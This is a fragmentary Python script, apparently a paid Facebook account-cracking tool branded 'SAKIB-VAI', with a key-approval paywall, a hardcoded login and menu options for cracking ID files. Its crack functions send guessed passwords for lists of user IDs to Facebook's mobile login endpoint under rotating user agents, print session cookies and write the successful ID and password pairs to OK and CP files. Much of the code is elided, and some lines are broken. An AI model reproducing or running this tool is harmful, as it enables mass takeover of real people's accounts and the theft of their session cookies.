...
time.sleep(2)
#os.system('clear')
print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 8.4v...! ')
...
time.sleep(2)
os.system(f'xdg-open https://www.youtube.com/@mrbachomiah4286')
os.system(f'xdg-open https://www.facebook.com/adorn.sadif?mibextid=ZbWKwL')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/arabir1jannat/Sakib-paid/blob/main/Aproval.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://t.me/arabir3953')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
logo ="""
    ...
    \033[33;1m\033[38;5;46m\033[34;1m\x1b[38;5;196m\033[33;1m
    \033[33;1m
\33[37;42m EHC SAKIB OWNER \33[0;m"\033[1;23m"""                                
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/MITUASF/Approval_SHAKIB.git').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      print(' \x1b[1;95m║══[𝟸]💥  15 DAY 700 TAKA ')
      print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 1000 TAKA ')
      os.system('espeak -a 300 " Hello,  Assalamualaikum,   I,   Am,    Robot,   of,    SAKIB vai tools,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('https://github.com/MITUASF/Approval_SHAKIB.git'+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python ar.abir.paidwifi7.2.py")
def naima():
	print('-------------------')
print(logo)
...
os.system('espeak -a 300 " Welcome,   to,  SAKIB vai,  PAID,   Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'Afreen' and password == 'SAKIB':
...
def menu():
    ...
    print(f"""\033[93;1m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ ID   """)
    print("""\033[98;1m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
    print('\033[0;97m=================')
    EHC = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if EHC in ['111']:
        login()
        dump_massal()
    elif EHC in ['1']:
        ...
        os.system('xdg-open https://t.me/ehccyber99kingpython')
        os.system("python nono.py")
    elif EHC in ['3','03']:
        result()
    elif EHC in ['0']:
...
def crack_file():
    ...
    print('\033[1;36m[ Put File Example:  /sdcard/sakib.txt  Etc...]')
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/Link.abdul.latif.cyber29")
    if hc in ['1','01']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[SAKIB-VAI-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                ...
                print(f'\r\033[0;96m[SAKIB-VAI-Ok🌸] ✅Uid┏━➤ {idf} ??Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id, from, Abir, vai, tools"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SAKIB-VAI 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•SAKIB-VAI-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SAKIB-VAI-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id, from, Abir, vai, tools"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
